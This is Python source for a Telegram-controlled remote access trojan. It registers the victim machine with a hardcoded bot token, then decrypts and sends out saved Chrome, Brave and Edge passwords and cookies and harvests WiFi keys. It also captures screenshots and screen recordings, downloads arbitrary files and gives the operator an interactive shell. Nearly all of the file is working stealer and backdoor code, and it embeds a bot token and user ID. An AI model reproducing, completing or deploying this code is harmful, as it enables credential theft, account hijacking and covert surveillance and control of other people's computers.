import telebot
import subprocess
import os
import platform
import threading
import cv2
import numpy as np
import pyautogui
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from PIL import ImageGrab
import shutil
import sqlite3
import json
import base64
import win32crypt  # Windows-only
from Cryptodome.Cipher import AES
import sys
import uuid


# Replace with your bot token
BOT_TOKEN = "7460159243:AAGA-z1WGSggVKCK1-EoVPSu-JoKNLiE_Yg"
USER_ID = 7648971114

bot = telebot.TeleBot(BOT_TOKEN)

# Global variables
recording = False
video_filename = "screen_record.avi"
user_paths = {}
devices = {}  # Dictionary to store registered devices: {device_id: device_name}

# Determine the operating system
IS_WINDOWS = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"

# Generate a unique device ID for this instance
DEVICE_ID = str(uuid.uuid4())
DEVICE_NAME = f"Device-{platform.node()}"  # Use the hostname as the device name

# Register the device with the bot
def register_device():
    devices[DEVICE_ID] = DEVICE_NAME
    bot.send_message(USER_ID, f"✅ *New Device Registered:*\n\n🔹 *ID:* {DEVICE_ID}\n🔹 *Name:* {DEVICE_NAME}", parse_mode="Markdown")

# Function to run shell commands
def run_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout if result.stdout else result.stderr
    except Exception as e:
        return str(e)

# Function to get WiFi passwords (Windows-specific)
def get_wifi_passwords_windows():
    output = run_command("netsh wlan show profiles")
    profiles = [line.split(":")[1].strip() for line in output.split("\n") if "All User Profile" in line]

    wifi_details = "🔐 Saved WiFi Passwords:\n"
    for profile in profiles:
        password_cmd = f'netsh wlan show profile "{profile}" key=clear'
        password_output = run_command(password_cmd)
        password_lines = [line.split(":")[1].strip() for line in password_output.split("\n") if "Key Content" in line]
        password = password_lines[0] if password_lines else "No Password Found"
        wifi_details += f"📶 {profile}: {password}\n"

    return wifi_details if profiles else "❌ No saved WiFi networks found."

# Function to get WiFi passwords (Linux-specific)
def get_wifi_passwords_linux():
    wifi_details = "🔐 Saved WiFi Passwords:\n"
    try:
        # Path to the WiFi configuration files
        wifi_config_path = "/etc/NetworkManager/system-connections/"
        if os.path.exists(wifi_config_path):
            for file in os.listdir(wifi_config_path):
                if file.endswith(".nmconnection"):
                    with open(os.path.join(wifi_config_path, file), "r") as f:
                        content = f.read()
                        ssid = file.replace(".nmconnection", "")
                        password = "Not Found"
                        if "psk=" in content:
                            password = content.split("psk=")[1].split("\n")[0]
                        wifi_details += f"📶 {ssid}: {password}\n"
            return wifi_details
        else:
            return "❌ No saved WiFi networks found."
    except Exception as e:
        return f"❌ Error: {str(e)}"

# Function to get WiFi passwords (platform-specific)
def get_wifi_passwords():
    if IS_WINDOWS:
        return get_wifi_passwords_windows()
    elif IS_LINUX:
        return get_wifi_passwords_linux()
    else:
        return "❌ Unsupported operating system."

# Function to capture a screenshot
def capture_screenshot():
    screenshot_path = "screenshot.png"
    img = ImageGrab.grab()
    img.save(screenshot_path)
    return screenshot_path

# Function to record the screen
def record_screen():
    global recording
    screen_size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(video_filename, fourcc, 10, screen_size)

    while recording:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)

    out.release()

# Function to send long messages in chunks
def send_long_message(chat_id, text):
    MAX_LENGTH = 4000
    for i in range(0, len(text), MAX_LENGTH):
        bot.send_message(chat_id, f"```\n{text[i:i+MAX_LENGTH]}\n```", parse_mode="Markdown")

# Function to show the device selection menu
def show_device_menu(chat_id):
    markup = InlineKeyboardMarkup()

    if not devices:
        bot.send_message(chat_id, "❌ No devices registered.")
        return

    for device_id, device_name in devices.items():
        markup.add(InlineKeyboardButton(device_name, callback_data=f"select_device:{device_id}"))

    bot.send_message(chat_id, "🔹 *Select a Device:*", reply_markup=markup, parse_mode="Markdown")

# Function to show the main menu (platform-specific)
def show_main_menu(chat_id, device_id):
    markup = InlineKeyboardMarkup()

    # Common options
    buttons = [
        ("📌 IP Config", "ipconfig"),
        ("📡 WiFi Profiles", "wifi_profiles"),
        ("🔐 WiFi Passwords", "wifi_passwords"),
        ("📋 Task List", "tasklist"),
        ("🌐 Netstat", "netstat"),
        ("👥 Users", "users"),
        ("🛠 Installed Apps", "installed_apps"),
        ("📸 Screenshot", "screenshot"),
        ("📂 Download File", "download"),
        ("🎥 Screen Record", "screen_record_menu"),
        ("🔴 Shutdown", "shutdown"),
        ("♻ Restart", "restart"),
        ("🔹 CMD/Terminal Access", "cmd_access"),
        ("🔓 Extract Browser Passwords", "extract_passwords"),  # Available on both Windows and Linux
        ("🍪 Extract Browser Cookies", "extract_cookies"),
    ]

    for text, callback in buttons:
        markup.add(InlineKeyboardButton(text, callback_data=f"{callback}:{device_id}"))

    bot.send_message(chat_id, "🔹 *Select an Option:*", reply_markup=markup, parse_mode="Markdown")

# Function to list files and folders
def list_files(chat_id, path=None, device_id=None):
    if not path:
        if IS_WINDOWS:
            drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        else:
            drives = ["/"]
        user_paths[chat_id] = None
        items = drives
    else:
        user_paths[chat_id] = path
        items = os.listdir(path)

    markup = InlineKeyboardMarkup()
    if path:
        markup.add(InlineKeyboardButton("🔙 Back", callback_data=f"back:{device_id}"))

    for item in items:
        full_path = os.path.join(path, item) if path else item
        if os.path.isdir(full_path):
            markup.add(InlineKeyboardButton(f"📂 {item}", callback_data=f"folder:{full_path}:{device_id}"))
        else:
            markup.add(InlineKeyboardButton(f"📄 {item}", callback_data=f"file:{full_path}:{device_id}"))

    bot.send_message(chat_id, "📂 *Select a File or Folder:*", reply_markup=markup, parse_mode="Markdown")

# Function to execute CMD/Terminal commands
def execute_cmd(message, device_id):
    chat_id = message.chat.id
    command = message.text

    # Exit command to close CMD/Terminal access
    if command.lower() in ["exit", "quit"]:
        bot.send_message(chat_id, "❌ *CMD/Terminal Access Closed.*", parse_mode="Markdown")
        return

    # Execute the command
    output = run_command(command)

    # Send the output to the user
    send_long_message(chat_id, output)

    # Prompt for the next command
    bot.send_message(chat_id, "✅ *Enter another command or type 'exit' to close CMD/Terminal access.*", parse_mode="Markdown")
    bot.register_next_step_handler_by_chat_id(chat_id, lambda msg: execute_cmd(msg, device_id))  # Keep session active

# Function to get the master key for Chrome-based browsers
def get_master_key(browser_user_data_path):
    if IS_WINDOWS:
        local_state_path = os.path.join(browser_user_data_path, "Local State")
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as e:
            return None
    elif IS_LINUX:
        # On Linux, the key is stored in the keyring
        try:
            from Cryptodome.Protocol.KDF import PBKDF2
            from Cryptodome.Cipher import AES
            import secretstorage

            bus = secretstorage.dbus_init()
            collection = secretstorage.get_default_collection(bus)
            for item in collection.get_all_items():
                if item.get_label() == "Chrome Safe Storage":
                    chrome_key = item.get_secret()
                    break
            else:
                return None

            # Derive the master key using PBKDF2
            salt = b"saltysalt"
            iterations = 1003
            key = PBKDF2(chrome_key, salt, 16, iterations)
            return key
        except Exception as e:
            return None
    else:
        return None

# Function to decrypt Chrome-based browser passwords
def decrypt_chrome_password(encrypted_password, master_key):
    try:
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(payload)[:-16].decode()
            return decrypted_password
        else:
            return str(win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1])
    except Exception as e:
        return "Decryption failed"

# Function to find Chrome-based browser profiles
def find_chrome_profiles(browser_user_data_path):
    profiles = []
    if not os.path.exists(browser_user_data_path):
        return []

    common_profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Guest Profile"]
    for profile in common_profiles:
        profile_path = os.path.join(browser_user_data_path, profile, "Login Data")
        if os.path.exists(profile_path):
            profiles.append(profile_path)

    for item in os.listdir(browser_user_data_path):
        if item.startswith("Profile ") and os.path.isdir(os.path.join(browser_user_data_path, item)):
            login_data_path = os.path.join(browser_user_data_path, item, "Login Data")
            if login_data_path not in profiles and os.path.exists(login_data_path):
                profiles.append(login_data_path)

    return profiles

# Function to extract passwords from Chrome-based browsers
def extract_chrome_passwords(db_path, master_key):
    temp_path = db_path + "_copy"
    try:
        shutil.copy2(db_path, temp_path)
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()

        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        data = cursor.fetchall()

        passwords = []
        for row in data:
            site, username, encrypted_password = row
            if username and encrypted_password:
                decrypted_password = decrypt_chrome_password(encrypted_password, master_key)
                passwords.append({"site": site, "username": username, "password": decrypted_password})

        conn.close()
        os.remove(temp_path)
        return passwords
    except Exception as e:
        return []

# Function to extract browser passwords (Windows and Linux)
def extract_browser_passwords():
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA" if IS_WINDOWS else "HOME"), "Google", "Chrome", "User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA" if IS_WINDOWS else "HOME"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA" if IS_WINDOWS else "HOME"), "Microsoft", "Edge", "User Data"),
    }

    all_passwords = []
    for browser_name, browser_path in browsers.items():
        if not os.path.exists(browser_path):
            continue

        master_key = get_master_key(browser_path)
        if not master_key:
            continue

        profiles = find_chrome_profiles(browser_path)
        if not profiles:
            continue

        for db_path in profiles:
            passwords = extract_chrome_passwords(db_path, master_key)
            if passwords:
                all_passwords.extend(passwords)

    if all_passwords:
        result = "🔓 *Extracted Browser Passwords:*\n\n"
        for entry in all_passwords:
            result += f"🌐 *Site:* {entry['site']}\n👤 *Username:* {entry['username']}\n🔑 *Password:* {entry['password']}\n\n"
        return result
    else:
        return "❌ No saved passwords found."

# Function to extract cookies from Chrome-based browsers
def extract_chrome_cookies(db_path, master_key):
    temp_path = db_path + "_copy"
    try:
        shutil.copy2(db_path, temp_path)
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()

        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies")
        data = cursor.fetchall()

        cookies = []
        for row in data:
            host, name, encrypted_value, path, expires, secure = row
            if encrypted_value:
                decrypted_value = decrypt_chrome_password(encrypted_value, master_key)
                cookies.append({
                    "domain": host,
                    "name": name,
                    "value": decrypted_value,
                    "path": path,
                    "expires": expires,
                    "secure": bool(secure)
                })

        conn.close()
        os.remove(temp_path)
        return cookies
    except Exception as e:
        return []

# Function to find Chrome-based cookie databases
def find_chrome_cookie_db(browser_user_data_path):
    profiles = []
    if not os.path.exists(browser_user_data_path):
        return []

    common_profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Guest Profile"]
    for profile in common_profiles:
        cookie_path = os.path.join(browser_user_data_path, profile, "Network", "Cookies")
        if os.path.exists(cookie_path):
            profiles.append(cookie_path)

    for item in os.listdir(browser_user_data_path):
        if item.startswith("Profile ") and os.path.isdir(os.path.join(browser_user_data_path, item)):
            cookie_path = os.path.join(browser_user_data_path, item, "Network", "Cookies")
            if cookie_path not in profiles and os.path.exists(cookie_path):
                profiles.append(cookie_path)

    return profiles

# Function to extract browser cookies (Windows and Linux)
def extract_browser_cookies():
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA" if IS_WINDOWS else "HOME"), "Google", "Chrome", "User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA" if IS_WINDOWS else "HOME"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA" if IS_WINDOWS else "HOME"), "Microsoft", "Edge", "User Data"),
    }

    all_cookies = []
    for browser_name, browser_path in browsers.items():
        if not os.path.exists(browser_path):
            continue

        master_key = get_master_key(browser_path)
        if not master_key:
            continue

        cookie_dbs = find_chrome_cookie_db(browser_path)
        if not cookie_dbs:
            continue

        for db_path in cookie_dbs:
            cookies = extract_chrome_cookies(db_path, master_key)
            if cookies:
                all_cookies.extend(cookies)

    if all_cookies:
        cookies_by_domain = {}
        for cookie in all_cookies:
            if cookie['domain'] not in cookies_by_domain:
                cookies_by_domain[cookie['domain']] = []
            cookies_by_domain[cookie['domain']].append(cookie)

        result = "🍪 *Extracted Browser Cookies:*\n\n"
        for domain, cookies in cookies_by_domain.items():
            result += f"🌐 *Domain:* {domain}\n"
            for cookie in cookies:
                result += f"  🔹 *{cookie['name']}*: {cookie['value']}\n"
                result += f"    Path: {cookie['path']} | Secure: {'Yes' if cookie['secure'] else 'No'}\n"
            result += "\n"
        return result
    else:
        return "❌ No cookies found."

# Handler for the /start and /help commands
@bot.message_handler(func=lambda message: message.chat.id == USER_ID)
def command_handler(message):
    if message.text == "/start" or message.text == "/help":
        show_device_menu(message.chat.id)

# Handler for callback queries
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    global recording
    chat_id = call.message.chat.id
    command = call.data

    if command.startswith("select_device:"):
        device_id = command.split(":")[1]
        show_main_menu(chat_id, device_id)
    elif command.startswith("ipconfig:"):
        device_id = command.split(":")[1]
        output = run_command("ipconfig" if IS_WINDOWS else "ifconfig")
        send_long_message(chat_id, output)
        show_main_menu(chat_id, device_id)
    elif command.startswith("wifi_profiles:"):
        device_id = command.split(":")[1]
        output = run_command("netsh wlan show profiles" if IS_WINDOWS else "nmcli dev wifi")
        send_long_message(chat_id, output)
        show_main_menu(chat_id, device_id)
    elif command.startswith("wifi_passwords:"):
        device_id = command.split(":")[1]
        output = get_wifi_passwords()
        send_long_message(chat_id, output)
        show_main_menu(chat_id, device_id)
    elif command.startswith("tasklist:"):
        device_id = command.split(":")[1]
        output = run_command("tasklist" if IS_WINDOWS else "ps aux")
        send_long_message(chat_id, output)
        show_main_menu(chat_id, device_id)
    elif command.startswith("netstat:"):
        device_id = command.split(":")[1]
        output = run_command("netstat -an" if IS_WINDOWS else "netstat -tuln")
        send_long_message(chat_id, output)
        show_main_menu(chat_id, device_id)
    elif command.startswith("users:"):
        device_id = command.split(":")[1]
        output = run_command("query user" if IS_WINDOWS else "who")
        send_long_message(chat_id, output)
        show_main_menu(chat_id, device_id)
    elif command.startswith("installed_apps:"):
        device_id = command.split(":")[1]
        output = run_command('wmic product get name' if IS_WINDOWS else "dpkg --list")
        send_long_message(chat_id, output)
        show_main_menu(chat_id, device_id)
    elif command.startswith("screenshot:"):
        device_id = command.split(":")[1]
        screenshot_path = capture_screenshot()
        bot.send_photo(chat_id, open(screenshot_path, "rb"))
        os.remove(screenshot_path)
        show_main_menu(chat_id, device_id)
    elif command.startswith("download:"):
        device_id = command.split(":")[1]
        list_files(chat_id, device_id=device_id)
    elif command.startswith("folder:"):
        parts = command.split(":")
        folder_path = parts[1]
        device_id = parts[2]
        list_files(chat_id, folder_path, device_id)
    elif command.startswith("file:"):
        parts = command.split(":")
        file_path = parts[1]
        device_id = parts[2]
        try:
            bot.send_document(chat_id, open(file_path, "rb"))
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error: {str(e)}")
        show_main_menu(chat_id, device_id)
    elif command.startswith("back:"):
        device_id = command.split(":")[1]
        prev_path = os.path.dirname(user_paths.get(chat_id, ""))
        list_files(chat_id, prev_path if prev_path else None, device_id)
    elif command.startswith("screen_record_menu:"):
        device_id = command.split(":")[1]
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("▶ Start Recording", callback_data=f"start_recording:{device_id}"))
        markup.add(InlineKeyboardButton("⏹ Stop Recording", callback_data=f"stop_recording:{device_id}"))
        bot.send_message(chat_id, "🎥 *Screen Recording Options:*", reply_markup=markup, parse_mode="Markdown")
    elif command.startswith("start_recording:"):
        device_id = command.split(":")[1]
        if not recording:
            recording = True
            bot.send_message(chat_id, "🎥 *Screen recording started...*")
            threading.Thread(target=record_screen).start()
        else:
            bot.send_message(chat_id, "⚠ *Screen recording is already running.*")
        show_main_menu(chat_id, device_id)
    elif command.startswith("stop_recording:"):
        device_id = command.split(":")[1]
        if recording:
            recording = False
            bot.send_message(chat_id, "⏹ *Screen recording stopped.* Sending file...")
            bot.send_video(chat_id, open(video_filename, "rb"))
            os.remove(video_filename)
        else:
            bot.send_message(chat_id, "⚠ *No active recording to stop.*")
        show_main_menu(chat_id, device_id)
    elif command.startswith("cmd_access:"):
        device_id = command.split(":")[1]
        bot.send_message(chat_id, "🖥 *CMD/Terminal Access Enabled*\n\nEnter your command:", parse_mode="Markdown")
        bot.register_next_step_handler_by_chat_id(chat_id, lambda msg: execute_cmd(msg, device_id))
    elif command.startswith("extract_passwords:"):
        device_id = command.split(":")[1]
        output = extract_browser_passwords()
        send_long_message(chat_id, output)
        show_main_menu(chat_id, device_id)
    elif command.startswith("extract_cookies:"):
        device_id = command.split(":")[1]
        output = extract_browser_cookies()
        send_long_message(chat_id, output)
        show_main_menu(chat_id, device_id)

    else:
        bot.send_message(chat_id, "❌ Unknown command.")

# Register the device when the script starts
register_device()

# Start the bot
bot.polling()
